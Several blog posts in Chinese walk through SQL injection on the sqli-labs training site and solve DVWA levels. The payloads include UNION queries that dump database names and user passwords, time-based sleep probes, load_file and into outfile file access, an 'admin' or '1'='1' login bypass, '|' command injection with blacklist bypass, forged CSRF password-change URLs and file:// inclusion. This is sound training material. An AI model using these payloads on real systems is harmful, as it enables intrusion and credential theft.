<p>?id &#x3D; 1’ order by 3 –+来实现判断这个数据库有几列  （–+是注释的意思）<br><img src="/.com//image-20250113172420-37zqzqi.png" alt="image">order by即通过第几列排序的意思</p>
</blockquote>
<pre><code>	?id=-1&#39; union select1,2,3 --+ 我们改成-1是为了前面不查询类容用union展示，这个也是为了判断回显位

 **获取数据库名 ： security**​​
</code></pre>
<blockquote>
<p>将回显位改为database()  ?id&#x3D;-1’ union select1,database(),3 –+</p>
</blockquote>
<pre><code>**获取表名 ：emails，less39，referers，uagents，users**
</code></pre>
<blockquote>
<p>?id=1’union select 1,2,group_concat(table_name) from information_schema.t<br> ables where table_schema=database()</p>
</blockquote>
<blockquote>
<p>?id&#x3D;-1’ union select1,(select group<a href>_concat(table</a>_name) from information_schema.tables where table_schema&#x3D;’security’ ),3 –+</p>
</blockquote>
<pre><code>**group_concat:**  把它合并成一个字符串

**tables_name:**  表名

**information_schema:**  MYSQL下的一个数据库
</code></pre>
<p>‍</p>
<pre><code>**获取列名：获取users表的列名：id，username，password**
</code></pre>
<blockquote>
<p>?id&#x3D;-1’ union select 1,(select group_concat(column_name) from information_schema.columns where tables_schema&#x3D;’security’ and table_name &#x3D; ‘users’),3 –+</p>
</blockquote>
<pre><code>**获取具体数据：**
</code></pre>
<blockquote>
<p>?id &#x3D; -1’ union select 1,(select group_concat(username) from users),3 –+</p>
</blockquote>
<p>‍</p>
<h3 id="取库名："><a href="#取库名：" class="headerlink" title="取库名："></a>取库名：</h3><blockquote>
<p>?id&#x3D;-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
</blockquote>
<h3 id="取表名："><a href="#取表名：" class="headerlink" title="取表名："></a>取表名：</h3><blockquote>
<p>?id&#x3D;-1’ union select1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’,3 –+</p>
</blockquote>
<h3 id="取列名："><a href="#取列名：" class="headerlink" title="取列名："></a>取列名：</h3><blockquote>
<p>?id&#x3D;-1’ union select1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’,3 –+</p>
</blockquote>
<h3 id="取密码，用户名："><a href="#取密码，用户名：" class="headerlink" title="取密码，用户名："></a>取密码，用户名：</h3><blockquote>
<p>?id&#x3D;-1’ union select1,group_concat(password) from security.users,3 –+</p>
</blockquote>
<h3 id="拼接用户名和密码"><a href="#拼接用户名和密码" class="headerlink" title="拼接用户名和密码"></a>拼接用户名和密码</h3><blockquote>
<p><strong>concat_ws(‘~’,A,B)</strong>  拼接 A~B</p>
</blockquote>
<blockquote>
<p>?id&#x3D;-1’ union select1,group_concat(concat_ws(‘~’,username,password)) from security.users,3 –+</p>
</blockquote>
<p>‍</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" data-id="cmawcfx9q003gcg7k70rr0s7q" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/注入漏洞/SQL注入/sql注入总结/union 注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/union%20%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="union-注入"><a href="#union-注入" class="headerlink" title="union 注入"></a>union 注入</h1><h3 id="一、原理及手工注入"><a href="#一、原理及手工注入" class="headerlink" title="一、原理及手工注入"></a>一、原理及手工注入</h3><hr>
<p>三个条件：</p>
<ol>
<li>两个表的<code>列数相同</code>​，并且相应的列具有<code>相似的数据类型</code>​。</li>
<li>查询结果<code>回显</code>​。</li>
<li>存在注入漏洞。</li>
</ol>
<p>我们可以通过<code>order by</code>​来判断当前表的列数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.209.128:88/Less-1/?id=1&#x27;  order by 4-- qwq</span><br></pre></td></tr></table></figure>

<p>4 时错误，3 时正确，可得知，当前表有 3 列</p>
<p><img src="/.com//image-20250519090453-q9nevqk.png" alt="image"></p>
<p><img src="/.com//image-20250519090456-ziat5np.png" alt="image"></p>
<p>通过union union查询来知道显示的列数。</p>
<p>​<code>http://192.168.209.128:88/Less-1/?id=-1&#39; union select 1 ,2 ,3 -- qwq</code>​</p>
<p><img src="/.com//image-20250519091423-lg6slw8.png" alt="image"></p>
<p>我们union查询的就显示出来了。可知，第 2 列和第 3 列是回显列。那我们就可以在这两个位置插入一些函数了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">version():查询数据库的版本</span><br><span class="line">user():查询数据库的使用者</span><br><span class="line">database():数据库</span><br><span class="line">system_user():系统用户名</span><br><span class="line">session_user():连接数据库的用户名</span><br><span class="line">current_user:当前用户名</span><br><span class="line">load_file:读取本地文件</span><br><span class="line">@@datadir:读取数据库路径</span><br><span class="line">@@basedir:mysql安装路径</span><br><span class="line">@@version_complie_os:查看操作系统</span><br></pre></td></tr></table></figure>

<p>开始注入脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//回显出数据库版本信息、数据库所在路径</span><br><span class="line">http://192.168.209.128:88/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,version(),@@datadir -- qwq</span></span><br><span class="line"><span class="string">//更多自行尝试</span></span><br><span class="line"><span class="string">。。。。。。</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250519091530-mom8i84.png" alt="image"></p>
<p>我们还可以通过 union 注入获得更多的信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 获得所有的数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 获得所有的表</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-1/?id=-1&#x27;</span> union <span class="keyword">select</span> 1,group_concat(table_name),3 from information_schema.tables--+</span><br><span class="line"></span><br><span class="line">// 获得所有的列</span><br><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns --+</span></span><br></pre></td></tr></table></figure>

<p>通过select 1,database(),3…，得出当前数据库名security，我们就可以通过下面的语句得到当前数据库的所有的表。</p>
<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; -- +</code>​</p>
<p><img src="/.com//image-20250519091738-nbcnr9w.png" alt="image"></p>
<p>我们知道了当前数据库中存在了四个表，那么我们可以通过下面的语句知道每个表中的列。</p>
<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; -- +</code>​</p>
<p>如下，我们可以知道 users 表中有 id，username，password 三列</p>
<p><img src="/.com//image-20250519091812-sx9wpg1.png" alt="image"></p>
<p>使用 group_concat()拼接账号密码还有 id，即可爆出所有数据</p>
<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(id,&#39;--&#39;,username,&#39;--&#39;,password),3 from users -- +</code>​</p>
<p><img src="/.com//image-20250519091835-7te350s.png" alt="image"></p>
<h2 id><a href="#" class="headerlink" title></a></h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/union%20%E6%B3%A8%E5%85%A5/" data-id="cmawcfx9s003ocg7kb5n9dehl" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场/sql——labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="sql——labs"><a href="#sql——labs" class="headerlink" title="sql——labs"></a>sql——labs</h1><h1 id="Less—1"><a href="#Less—1" class="headerlink" title="Less—1"></a>Less—1</h1><p>字符型包裹为 ‘’</p>
<h1 id="Less—2"><a href="#Less—2" class="headerlink" title="Less—2"></a>Less—2</h1><p>数字型无包裹</p>
<h1 id="Less—3"><a href="#Less—3" class="headerlink" title="Less—3"></a>Less—3</h1><p>字符括号包裹（’’）</p>
<h1 id="Less—4"><a href="#Less—4" class="headerlink" title="Less—4"></a>Less—4</h1><p>字符双引号括号包裹（””）</p>
<h1 id="Less—5"><a href="#Less—5" class="headerlink" title="Less—5"></a>Less—5</h1><p>布尔盲注</p>
<blockquote>
<p><strong>1.left函数：</strong> select left(database(),1)&#x3D;’s’;  left(a,b)从左侧截取a的前b位，正确则返回，错误返回</p>
<p><strong>2.regexp函数：</strong> select user() regexp ‘r’;   user()的结果是root，regexp为匹配root的正则表达式</p>
<p><strong>3.like函数：</strong> select user() like ‘ro%’;	 匹配与regexp相似</p>
<p><strong>4.substr(a,b,c):</strong>  select substr() XXXX;     substr(a,b,c)从位置b开始，截取a字符串c位长度  select substr((select database()),1,1)&#x3D;’s’;</p>
<p><strong>5.ascii:</strong></p>
<p><strong>6.chr(‘数字’)  ord(‘字母’)</strong>  			   python中转换ascii值</p>
</blockquote>
<p>‍</p>
<h1 id="Less——7"><a href="#Less——7" class="headerlink" title="Less——7"></a>Less——7</h1><blockquote>
<p>补充知识点</p>
<p>​<code>show variables like &#39;%secure%&#39;;</code>​查看secure-file-priv当前的值，如果显示为NULL，则需要打开，：\phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure file priv&#x3D;”&#x2F;”。</p>
<p>而且要先设置secure_file_priv&#x3D;,如果它为空则可以指定任意目录，如果设置等于某个路径就只能在这个指定路径下，而它为NULL则禁止导入导出功能</p>
<p>​<code>load_file()</code>​读取本地文件<code>select load_file(&#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7&#39;)</code>​</p>
<p>​<code>into outfile</code>​写文件    用法：<code>select &#39;mysql is very good&#39; into outfile &#39;test1.txt&#39;;</code>​</p>
<pre><code>				文件位置： 是在sql版本下的data文件中
</code></pre>
<p>我们要写到绝对位置那就，双反斜线是因为\t这种类型被转义掉了</p>
<p>​<code>select &#39;a&#39; into outfile &#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\tsxt.txt&#39;；</code>​</p>
<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">！！！注意sql语句中\需要转译</span></p>
</blockquote>
<p>‍</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" data-id="cmawcfxa0003wcg7kfupz8ggu" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/注入漏洞/SQL注入/sql注入总结/时间盲注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>​<code>Timing Attack注入，也就是时间盲注</code>​。通过简单的条件语句比如 and 1=2 是无法看出异常的。</p>
<p>在MySQL中，有一个<code>Benchmark()</code>​函数，它是用于测试性能的。Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p>
<p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为<code>Timing Attack</code>​，也就是时间盲注。</p>
<p>利用前提：<u><strong>页面上没有显示位</strong></u>​<u>，</u>​<u><strong>也没有输出 SQL 语句执行错误信息</strong></u>​<u>。</u>​<u><strong>正确的 SQL 语句和错误的 SQL 语句返回页面都一样</strong></u>​<u>，</u>​<u><strong>但是加入 sleep(5)条件之后</strong></u>​<u>，</u>​<u><strong>页面的返回速度明显慢了 5 秒</strong></u>​<u>。</u></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//判断是否存在延时注入</span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and sleep(5) --+</span></span><br></pre></td></tr></table></figure>

<p>‍</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="cmawcfxa8004mcg7keajxd1fo" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/DVWA靶场通关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="DVWA靶场通关"><a href="#DVWA靶场通关" class="headerlink" title="DVWA靶场通关"></a>DVWA靶场通关</h1><h2 id="1-暴力破解-brute-force"><a href="#1-暴力破解-brute-force" class="headerlink" title="1.暴力破解 brute force"></a>1.暴力破解 brute force</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><blockquote>
<p>使用bp抓包，分别在username和password处添加变量，使用集束炸弹（cluster bomb）模式，添加字典进行爆破</p>
</blockquote>
<p><img src="/.com//0c1252a336f1a19d4a0c461a2625dfbd-20250425163154-kusite3.png" alt="0c1252a336f1a19d4a0c461a2625dfbd"></p>
<p><img src="/.com//6a77d729ad1c18c986d038672540d012-20250425164624-cuo7973.png" alt="6a77d729ad1c18c986d038672540d012"></p>
<p>可以手工SQL注入（万能密码），在用户名框中输入admin’ or ‘1’=‘1，任意输入密码即可登陆（同时在弱口令字典里也有该语句）</p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p> 和low相比，过滤了一些转义字符，但依旧可以使用bp爆破方法同low</p>
<p><img src="/.com//b25d2a1090203c32d0788cdd25e2dcdc-20250425164628-ohxr4rn.png" alt="b25d2a1090203c32d0788cdd25e2dcdc"></p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p> 随意输入用户名密码，抓个包可以看到，携带了token</p>
<p><img src="/.com//b25d2a1090203c32d0788cdd25e2dcdc-20250425164628-ohxr4rn.png" alt="b25d2a1090203c32d0788cdd25e2dcdc-1"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerabilities/brute/?username=123&amp;password=123&amp;Login=Login&amp;user_token=bd32cb5998988f7c2f041f82f0dd701c HTTP/1.1</span><br><span class="line">Host: 69044566-74ca-4a40-bab8-8275aae0037d.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://69044566-74ca-4a40-bab8-8275aae0037d.node5.buuoj.cn:81/vulnerabilities/brute/</span><br><span class="line">Cookie: PHPSESSID=76shf76ao4uqleikshlanj6eh0; security=high</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure>

<blockquote>
<p>发送到Intruder，攻击类型选择交叉攻击Pitchfork，给password和token添加payload位置</p>
</blockquote>
<p><img src="/.com//image-20250425164433-gi0ryza.png" alt="image"></p>
<p><img src="/.com//image-20250425164358-rpkpeox.png" alt="image"></p>
<p>然后token选择递归提取，并且把初始可用的token代入</p>
<p><img src="/.com//image-20250425164754-z5wbyc4.png" alt="image"></p>
<p><img src="/.com//image-20250425164835-vvz11kl.png" alt="image"></p>
<p>然后开始攻击即可</p>
<p>‍</p>
<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>网站提示我们输入ip地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );//函数能执行系统命令</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里我们要说一下命令连接符<br>&amp; ：前面一个命令无论是否执行，后面的命令都能执行，两个命令都执行<br>&amp;&amp;：前面一个命令执行成功后，才能执行后面一个命令，两个命令都执行<br>|：前面一个命令无论是否执行，后面的命令都能执行且只执行后面一个<br>||：前面一个命令不能正常执行后，才能执行后面一个命令</p>
<p>我们使用“|”符号作为连接符让计算机做出除ping以外的操作实现命令注入<br>结果显示注入成功！<br>命令：127.0.0.1 | dir</p>
</blockquote>
<p>‍</p>
<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><p> 直接分析源码看看和Low等级有什么区别<br> 源码分析：发现在Low等级源码的基础上添加了一个黑名单，把‘&amp;&amp;’字符和‘;’字符过滤掉了，但我们可以使用黑名单之外的命令连接符继续命令注入</p>
<p><img src="/.com//9275c6eed4da2dc9b0c7c1e5e63d563c-20250425170542-d99goej.png" alt="9275c6eed4da2dc9b0c7c1e5e63d563c"></p>
<p>‍</p>
<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><p> 源码分析：发现还是一样的套路，也是过滤字符但过滤得更多了。但仔细观察发现有一个过滤是’| ‘，注意这个过滤是加了空格的，说明这个过滤其实是没用的，只需要’|’后面直接加入参数，不保留空格，我们依然可以用这个命令连接符进行命令注入</p>
<p><img src="/.com//a24bd3a257d4e129cca8019070a9b07d-20250425170620-rfpguy9.png" alt="a24bd3a257d4e129cca8019070a9b07d"></p>
<p>‍</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><p> 网站的本意是让我们在网站里更改密码</p>
<p><img src="/.com//1939fdc85c82e1df86c9b1f916522081-20250425171126-xu4wwp5.png" alt="1939fdc85c82e1df86c9b1f916522081"></p>
<blockquote>
<p>但是能够主要到当我们更改密码成功后url栏的参数是这样的<br><a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a><br>可以分析出password_new是我输入的密码，password_conf是我确认的密码，说明我们在网站上输入的信息是会在url栏这里进行一个传输执行</p>
</blockquote>
<p><img src="/.com//830adffb3898c5c5488d85ee81e8e6a9-20250425171137-dr9bhdv.png" alt="830adffb3898c5c5488d85ee81e8e6a9"></p>
<p>抓个包看看，发现url栏的信息和请求的信息是一致的</p>
<p> <img src="/.com//de160531a83b91e4ff84d165b7a7c13a-20250425171147-iksxt52.png" alt="de160531a83b91e4ff84d165b7a7c13a"></p>
<blockquote>
<p>那是不是说明如果我能控制url栏里传入的参数，就能够不在网站内执行更改密码的操作呢？<br>更改url的参数：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=456789&password_conf=456789&Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=456789&amp;password_conf=456789&amp;Change=Change#</a><br>只需要在原来的url基础上该新密码和确认密码的参数即可</p>
<p>为了显示效果，我使当前页面是密码不匹配状态</p>
</blockquote>
<p><img src="/.com//c170717135b963832851ab18cdd7291e-20250425171200-nuulqr6.png" alt="c170717135b963832851ab18cdd7291e"></p>
<p>在新标签内放入设置好的url，点击执行</p>
<p><img src="/.com//5c64252299acea56a3b35687d997aeb0-20250425171207-xr9kfct.png" alt="5c64252299acea56a3b35687d997aeb0"></p>
<p>页面跳转到了dvwa的更改密码界面，csrf攻击成功</p>
<p><img src="/.com//2ada0b8e5e0e9bc04452aa3935526506-20250425171213-9w5xvbr.png" alt="2ada0b8e5e0e9bc04452aa3935526506"></p>
<blockquote>
<p>网站的本意是在网站内更改密码，而我通过控制url的传参就能使我能在网站之外执行更改密码的操作，那么当我知道一个网站有csrf漏洞后也可以通过构造url的方式让别人点击执行他意想之外的行为</p>
<p>源码分析：源码中只对传入的密码和确认密码进行比较，两者一致则执行更改密码命令成功返回Password Change，不一致则返回Passwords did not match，没有任何过滤，所以能轻易执行csrf漏洞</p>
</blockquote>
<p><img src="/.com//f0c609415b16d644263608771e005b1a-20250425171252-o8j4acs.png" alt="f0c609415b16d644263608771e005b1a"></p>
<p>‍</p>
<h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><p> 源码分析：和Low等级比较发现，只有一处改变，即在传入密码和确认密码参数前先进行了一个&#x3D;&#x3D;if语句的判断&#x3D;&#x3D;，判断里面的内容主要是验证这个访问请求是否是从&#x3D;&#x3D;dwva网站&#x3D;&#x3D;本身发起的，若不是就不执行后面的操作</p>
<p><img src="/.com//9dbaa6761aa3ad43ade255e9fe296b30-20250425171315-yfcd81j.png" alt="9dbaa6761aa3ad43ade255e9fe296b30"></p>
<p>源码是通过referrer这个字段的参数进行判断的，通常情况下在增加referrer验证时就是网站本身当前页面的ip地址，我们通过抓包看看信息</p>
<p>首先抓一个包，可以看到这里有referer</p>
<p><img src="/.com//9cea6507c937a1c9f35fd8b63940524c-20250425171659-wyha15h.png" alt="9cea6507c937a1c9f35fd8b63940524c"></p>
<p>复制刚才构造好的url，在新页面打开：<a target="_blank" rel="noopener" href="http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&password_conf=666666&Change=Change#" title="http:&#x2F;&#x2F;192.168.10.5&#x2F;DVWA&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;666666&amp;password_conf&#x3D;666666&amp;Change&#x3D;Change#">http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new&#x3D;666666&amp;password_conf&#x3D;666666&amp;Change&#x3D;Change#</a></p>
<p>抓包，发现没有referer</p>
<p><img src="/.com//3d4b2706cc958a8f1394de205839b040-20250425171716-w1cnaaw.png" alt="3d4b2706cc958a8f1394de205839b040"></p>
<p>我们自己在这里加一个referer，随意添加，包含本机就可以例如：127.0.0.1</p>
<p><img src="/.com//ab872067c571ccab991bbebbbe9c311d-20250425171723-miwfpva.png" alt="ab872067c571ccab991bbebbbe9c311d"></p>
<p>放包，发现已经成功修改</p>
<p>‍</p>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p> 可以看到，设置了token</p>
<p> 这里我们采用抓包，把包发到重放模块，在row中可以看到新的token</p>
<p><img src="/.com//4eb20c2a54b3919e475b47dfde22f4ff-20250425171734-p8nrrqi.png" alt="4eb20c2a54b3919e475b47dfde22f4ff"></p>
<blockquote>
<p>接下来使用获取到的新token构造链接</p>
<p><a target="_blank" rel="noopener" href="http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&password_conf=666666&Change=Change&user_token=9c36edfc71b135e726adce6603be8651">http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&amp;password_conf=666666&amp;Change=Change&amp;user_token=9c36edfc71b135e726adce6603be8651</a></p>
<p>修改成功</p>
</blockquote>
<p>‍</p>
<h2 id="4-File-inclusion-文件包含"><a href="#4-File-inclusion-文件包含" class="headerlink" title="4.File inclusion 文件包含"></a>4.File inclusion 文件包含</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p> 每次点击都会跳转，所以可以在page=后面添加本地文件路径</p>
<p><img src="/.com//7386fd3fd2979574a11e49bbf188337a-20250425172020-tcersi4.png" alt="7386fd3fd2979574a11e49bbf188337a"></p>
<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p> 可以通过ip+路径包含文件</p>
<p><img src="/.com//d28bea7da6e424606062dfb78c2893e1-20250425172030-4kgs98a.png" alt="d28bea7da6e424606062dfb78c2893e1"></p>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p><img src="/.com//ea03f7407dc9279a2ed7d860673023f0-20250425172036-kxf2wi3.png" alt="ea03f7407dc9279a2ed7d860673023f0"></p>
<p>源码限制了page之后的参数是以file开头，所以可以用file函数去构建</p>
<p> <a target="_blank" rel="noopener" href="http://192.168.10.5/DVWA/vulnerabilities/fi/?page=file://E:%5CphpStudy%5CWWW%5CDVWA%5Cfile555.txt" title="http:&#x2F;&#x2F;192.168.10.5&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;E:\phpStudy\WWW\DVWA\file555.txt">http://192.168.10.5/DVWA/vulnerabilities/fi/?page=file://E:\phpStudy\WWW\DVWA\file555.txt</a></p>
<p><img src="/.com//b94534da3ee8d55a722bd51d644994e6-20250425172043-5fapvh7.png" alt="b94534da3ee8d55a722bd51d644994e6"></p>
<p>‍</p>
